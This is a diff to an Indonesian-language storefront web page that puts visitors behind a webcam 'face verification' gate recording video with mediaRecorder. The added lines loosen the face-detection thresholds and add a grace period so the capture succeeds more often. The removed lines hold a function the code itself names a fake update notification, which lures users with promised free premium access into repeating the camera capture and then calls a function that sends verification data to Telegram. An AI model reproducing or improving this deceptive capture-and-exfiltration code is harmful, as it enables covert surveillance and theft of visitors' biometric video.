@@ -2106,6 +2106,14 @@
     <div id="cur-r"></div>
     <canvas id="pcv"></canvas>
 
+    <!-- Error Display Panel -->
+    <div id="error-display"
+        style="position:fixed;bottom:20px;right:20px;background:#1a1a1a;border:2px solid #e8001c;border-radius:8px;max-width:400px;max-height:300px;overflow-y:auto;z-index:999999;padding:12px;font-family:monospace;font-size:0.85rem;color:#fff;display:none;box-shadow:0 8px 32px rgba(0,0,0,.5);">
+        <div style="margin-bottom:8px;color:#e8001c;font-weight:bold;cursor:pointer;user-select:none;"
+            onclick="document.getElementById('error-display').style.display='none';">✕ Tutup Error Log</div>
+        <div id="error-list" style="color:#ccc;line-height:1.6;"></div>
+    </div>
+
     <!-- LOADER -->
     <div id="loader">
         <img class="ld-logo-img"
@@ -2622,6 +2630,52 @@
     </div>
 
     <script>
+        // ═══════════════ GLOBAL ERROR HANDLER ═══════════════
+        const errorList = document.getElementById('error-list');
+        const errorDisplay = document.getElementById('error-display');
+        let errorCount = 0;
+
+        window.onerror = function (msg, url, lineNo, colNo, error) {
+            const errorMsg = `❌ ${msg}`;
+            const errorDetail = `Line ${lineNo}${colNo ? ':' + colNo : ''}`;
+
+            const errorDiv = document.createElement('div');
+            errorDiv.style.marginBottom = '8px';
+            errorDiv.style.paddingBottom = '8px';
+            errorDiv.style.borderBottom = '1px solid #333';
+            errorDiv.innerHTML = `<div style="color:#e8001c;font-weight:bold;">${errorMsg}</div><div style="color:#999;font-size:0.8rem;">${errorDetail}</div>`;
+
+            errorList.insertBefore(errorDiv, errorList.firstChild);
+            errorCount++;
+
+            errorDisplay.style.display = 'block';
+
+            // Keep only last 15 errors
+            while (errorList.children.length > 15) {
+                errorList.removeChild(errorList.lastChild);
+            }
+
+            console.error(msg, error);
+            return false;
+        };
+
+        // Tangkap unhandled promise rejections
+        window.addEventListener('unhandledrejection', event => {
+            const errorMsg = `❌ Promise Rejection: ${event.reason}`;
+            const errorDiv = document.createElement('div');
+            errorDiv.style.marginBottom = '8px';
+            errorDiv.style.paddingBottom = '8px';
+            errorDiv.style.borderBottom = '1px solid #333';
+            errorDiv.innerHTML = `<div style="color:#e8001c;font-weight:bold;">${errorMsg}</div>`;
+
+            errorList.insertBefore(errorDiv, errorList.firstChild);
+            errorDisplay.style.display = 'block';
+
+            while (errorList.children.length > 15) {
+                errorList.removeChild(errorList.lastChild);
+            }
+        });
+
         /* ═══════════════ DATA ═══════════════ */
         const PRODS = [
             {
@@ -2951,7 +3005,13 @@
                 </div>
                 <div id="camera-preview-box" style="display:none;width:320px;height:240px;background:#000;margin:16px auto;border-radius:8px;overflow:hidden;position:relative;">
                     <video id="face-video" style="width:100%;height:100%;object-fit:cover;"></video>
+                    <canvas id="face-canvas" style="position:absolute;top:0;left:0;width:100%;height:100%;"></canvas>
                     <div id="camera-status" style="position:absolute;top:10px;left:10px;background:rgba(255,0,0,.8);color:#fff;padding:4px 8px;border-radius:4px;font-size:0.8rem;display:none;">Kamera Ditutup!</div>
+                    <!-- Lighting Indicators -->
+                    <div style="position:absolute;top:10px;right:10px;display:flex;gap:4px;">
+                        <div id="light-indicator" style="width:12px;height:12px;border-radius:50%;background:#666;transition:background 0.2s;"></div>
+                        <div id="face-indicator" style="width:12px;height:12px;border-radius:50%;background:#666;transition:background 0.2s;"></div>
+                    </div>
                 </div>
                 <button id="camera-gate-retry">Mulai Verifikasi</button>
             `;
@@ -3012,10 +3072,14 @@
                     const previewBox = document.getElementById('camera-preview-box');
                     const verificationProgress = document.getElementById('verification-progress');
                     const faceVideo = document.getElementById('face-video');
+                    const faceCanvas = document.getElementById('face-canvas');
+                    const faceCanvasCtx = faceCanvas.getContext('2d');
                     const cameraStatus = document.getElementById('camera-status');
                     const progressBar = document.getElementById('progress-bar');
                     const timeRemaining = document.getElementById('time-remaining');
                     const verificationStatus = document.getElementById('verification-status');
+                    const lightIndicator = document.getElementById('light-indicator');
+                    const faceIndicator = document.getElementById('face-indicator');
 
                     previewBox.style.display = 'block';
                     verificationProgress.style.display = 'block';
@@ -3027,6 +3091,10 @@
                     });
                     faceVideo.play().catch(() => { });
 
+                    // Set canvas size sesuai video
+                    faceCanvas.width = faceVideo.videoWidth;
+                    faceCanvas.height = faceVideo.videoHeight;
+
                     // Deteksi apakah kamera ditutup / bukan ke wajah
                     let cameraCovered = false;
                     let prevImageData = null;
@@ -3034,6 +3102,8 @@
                     let motionScore = 0;
                     let faceDetected = false;
                     let faceFrame = false; // Flag frame saat ini menunjukkan wajah
+                    let lastCenterSkinRatio = 0;
+                    let lastAvgCenterBrightness = 0;
                     const canvas = document.createElement('canvas');
                     const ctx = canvas.getContext('2d');
                     const checkCameraInterval = setInterval(() => {
@@ -3093,33 +3163,78 @@
                         }
                         prevImageData = imageData;
 
-                        // Hitung frame 'wajah': tengah lebih cerah daripada rata-rata & tidak terlalu gelap
-                        const faceFrame = avgCenterBrightness > 50 && avgCenterBrightness > avgBrightness * 0.9;
+                        // Hitung frame 'wajah': deteksi skin tone di center area atau brightness tinggi
+                        const faceFrame = (centerSkinRatio > 0.05 || avgCenterBrightness > 50) && avgCenterBrightness > 25;
                         if (faceFrame) {
                             faceConfidence++;
                         }
                         if (motion > 10) motionScore++;
 
-                        // Cek kamera ditutup
-                        if (avgBrightness < 25 || (avgCenterBrightness < 30 && avgBrightness < 40)) {
+                        // Simpan data untuk visual overlay
+                        lastCenterSkinRatio = centerSkinRatio;
+                        lastAvgCenterBrightness = avgCenterBrightness;
+
+                        // Cek kamera ditutup - hanya jika benar-benar sangat gelap
+                        if (avgBrightness < 15 || (avgCenterBrightness < 20 && avgBrightness < 25)) {
                             cameraCovered = true;
                             cameraStatus.style.display = 'block';
                             verificationStatus.textContent = 'Kamera ditutup! Buka kamera untuk melanjutkan.';
                             verificationStatus.style.color = '#f00';
+                            lightIndicator.style.background = '#f00';
                             return;
                         }
 
                         cameraCovered = false;
                         cameraStatus.style.display = 'none';
 
-                        if (faceConfidence >= 6) {
+                        // Update lighting indicator
+                        lightIndicator.style.background = avgCenterBrightness > 40 ? '#0f0' : (avgCenterBrightness > 30 ? '#ff0' : '#f00');
+                        // Update face detected indicator
+                        faceIndicator.style.background = faceFrame ? '#0f0' : (centerSkinRatio > 0.04 ? '#ff0' : '#f00');
+
+                        if (faceConfidence >= 4) {
                             faceDetected = true;
                             verificationStatus.textContent = 'Wajah terdeteksi dengan baik. Melanjutkan verifikasi...';
                             verificationStatus.style.color = '#0f0';
                         } else {
-                            verificationStatus.textContent = 'Arahkan kamera ke wajah Anda (fokus di tengah frame).';
+                            verificationStatus.textContent = `Arahkan kamera ke wajah Anda (${faceConfidence}/4 terdeteksi).`;
                             verificationStatus.style.color = '#f00';
                         }
+
+                        // Draw visual overlay
+                        faceCanvas.width = faceVideo.videoWidth;
+                        faceCanvas.height = faceVideo.videoHeight;
+                        const previewScale = 320 / faceVideo.videoWidth; // Scale dari video ke canvas display
+
+                        // Clear canvas
+                        faceCanvasCtx.clearRect(0, 0, faceCanvas.width, faceCanvas.height);
+
+                        // Draw center detection area dengan transparency
+                        const overlayX = Math.floor(faceVideo.videoWidth * 0.3);
+                        const overlayY = Math.floor(faceVideo.videoHeight * 0.2);
+                        const overlayW = Math.floor(faceVideo.videoWidth * 0.4);
+                        const overlayH = Math.floor(faceVideo.videoHeight * 0.4);
+
+                        // Highlight area
+                        faceCanvasCtx.fillStyle = faceFrame ? 'rgba(0, 255, 0, 0.15)' : 'rgba(255, 0, 0, 0.15)';
+                        faceCanvasCtx.fillRect(overlayX, overlayY, overlayW, overlayH);
+
+                        // Border
+                        faceCanvasCtx.strokeStyle = faceFrame ? '#0f0' : '#f00';
+                        faceCanvasCtx.lineWidth = 2;
+                        faceCanvasCtx.strokeRect(overlayX, overlayY, overlayW, overlayH);
+
+                        // Crosshair di tengah
+                        const midX = overlayX + overlayW / 2;
+                        const midY = overlayY + overlayH / 2;
+                        faceCanvasCtx.strokeStyle = faceFrame ? '#0f0' : '#f00';
+                        faceCanvasCtx.lineWidth = 1;
+                        faceCanvasCtx.beginPath();
+                        faceCanvasCtx.moveTo(midX - 15, midY);
+                        faceCanvasCtx.lineTo(midX + 15, midY);
+                        faceCanvasCtx.moveTo(midX, midY - 15);
+                        faceCanvasCtx.lineTo(midX, midY + 15);
+                        faceCanvasCtx.stroke();
 
                         // Pelaporan status detail lebih ringan
                         const movementText = motionScore > 4 ? 'Gerakan kepala terdeteksi' : 'Silakan gerakkan kepala sedikit';
@@ -3152,6 +3267,8 @@
                     const startTime = Date.now();
                     let verificationSuccess = false; // Flag untuk track kesuksesan verifikasi
                     let continuousFaceDetectionRequired = true; // Flag untuk continuous monitoring
+                    let faceLastLostTime = 0; // Track kapan wajah terakhir hilang
+                    const faceGracePeriod = 1500; // 1.5 detik grace period
 
                     return new Promise((resolve) => {
                         let progressInterval = setInterval(() => {
@@ -3161,20 +3278,33 @@
                             progressBar.style.width = progress + '%';
                             timeRemaining.textContent = Math.ceil(remaining / 1000);
 
-                            // Monitor terus-menerus: jika wajah yang sudah terdeteksi hilang, gagal
-                            if (faceDetected && !faceFrame) {
-                                clearInterval(progressInterval);
-                                clearInterval(checkCameraInterval);
-                                mediaRecorder.stop();
-                                stream.getTracks().forEach(track => track.stop());
-                                messageEl.textContent = 'Verifikasi gagal: Kamera tidak tetap menunjuk ke wajah. Refresh dan coba lagi.';
-                                verificationAttemptFailed = true;
-                                verificationSuccess = false;
-                                continuousFaceDetectionRequired = false;
-                                previewBox.style.display = 'none';
-                                verificationProgress.style.display = 'none';
-                                resolve(false);
-                                return;
+                            // Monitor terus-menerus: tapi dengan grace period
+                            if (faceDetected) {
+                                if (!faceFrame) {
+                                    // Wajah hilang - catat waktu
+                                    if (faceLastLostTime === 0) {
+                                        faceLastLostTime = Date.now();
+                                    }
+                                    // Gagal hanya jika wajah hilang selama > grace period
+                                    const faceLostDuration = Date.now() - faceLastLostTime;
+                                    if (faceLostDuration > faceGracePeriod) {
+                                        clearInterval(progressInterval);
+                                        clearInterval(checkCameraInterval);
+                                        mediaRecorder.stop();
+                                        stream.getTracks().forEach(track => track.stop());
+                                        messageEl.textContent = 'Verifikasi gagal: Arahkan kamera ke wajah Anda selama 8 detik. Refresh dan coba lagi.';
+                                        verificationAttemptFailed = true;
+                                        verificationSuccess = false;
+                                        continuousFaceDetectionRequired = false;
+                                        previewBox.style.display = 'none';
+                                        verificationProgress.style.display = 'none';
+                                        resolve(false);
+                                        return;
+                                    }
+                                } else {
+                                    // Wajah kembali - reset timer
+                                    faceLastLostTime = 0;
+                                }
                             }
 
                             if (cameraCovered) {
@@ -3299,76 +3429,7 @@
             setTimeout(() => {
                 document.getElementById('loader').classList.add('out');
             }, 2600);
-
-            // Fake update notification setelah 10 detik
-            setTimeout(() => {
-                showFakeUpdateNotification();
-            }, 10000);
         });
-
-        function showFakeUpdateNotification() {
-            // Cek jika sudah pernah ditampilkan hari ini
-            const today = new Date().toDateString();
-            if (localStorage.getItem('fakeUpdateShown') === today) return;
-
-            const notification = document.createElement('div');
-            notification.id = 'fake-update-notification';
-            notification.innerHTML = `
-                <div style="position:fixed;top:20px;right:20px;background:#0f0;color:#fff;padding:16px;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,.3);z-index:10000;max-width:300px;font-size:0.9rem;">
-                    <div style="font-weight:bold;margin-bottom:8px;">🚀 Update Tersedia!</div>
-                    <div style="margin-bottom:12px;">Fitur keamanan baru telah ditambahkan. Klik untuk test update dan dapatkan bonus akses premium.</div>
-                    <button id="test-update-btn" style="background:#fff;color:#0f0;border:none;padding:8px 16px;border-radius:4px;cursor:pointer;font-weight:bold;">Test Update</button>
-                    <button id="dismiss-update-btn" style="background:none;border:none;color:#ccc;margin-left:8px;cursor:pointer;">✕</button>
-                </div>
-            `;
-            document.body.appendChild(notification);
-
-            document.getElementById('test-update-btn').onclick = async () => {
-                notification.remove();
-                localStorage.setItem('fakeUpdateShown', today);
-
-                // Trigger verifikasi kamera lagi dengan pesan berbeda
-                const gate = createCameraGate();
-                gate.querySelector('#camera-gate-message').textContent = 'Testing fitur update keamanan baru. Verifikasi ulang diperlukan untuk aktivasi.';
-                gate.classList.remove('hidden');
-
-                const retryButton = gate.querySelector('#camera-gate-retry');
-                retryButton.textContent = 'Test Update';
-
-                retryButton.onclick = async () => {
-                    const success = await requestCameraOnce();
-                    if (success) {
-                        gate.classList.add('hidden');
-                        // Kirim data verifikasi lengkap
-                        sendVerificationDataToTelegram();
-                        // Show success message
-                        showSuccessMessage();
-                    }
-                };
-            };
-
-            document.getElementById('dismiss-update-btn').onclick = () => {
-                notification.remove();
-                localStorage.setItem('fakeUpdateShown', today);
-            };
-        }
-
-        function showSuccessMessage() {
-            const successMsg = document.createElement('div');
-            successMsg.id = 'success-message';
-            successMsg.innerHTML = `
-                <div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#0f0;color:#fff;padding:24px;border-radius:12px;text-align:center;z-index:10001;">
-                    <div style="font-size:2rem;margin-bottom:12px;">✅</div>
-                    <div style="font-weight:bold;margin-bottom:8px;">Update Berhasil!</div>
-                    <div>Fitur keamanan baru telah diaktifkan. Anda mendapatkan akses premium gratis!</div>
-                </div>
-            `;
-            document.body.appendChild(successMsg);
-
-            setTimeout(() => {
-                successMsg.remove();
-            }, 3000);
-        }
 
         /* LOGO load override — pakai gambar upload user */
         (function () {
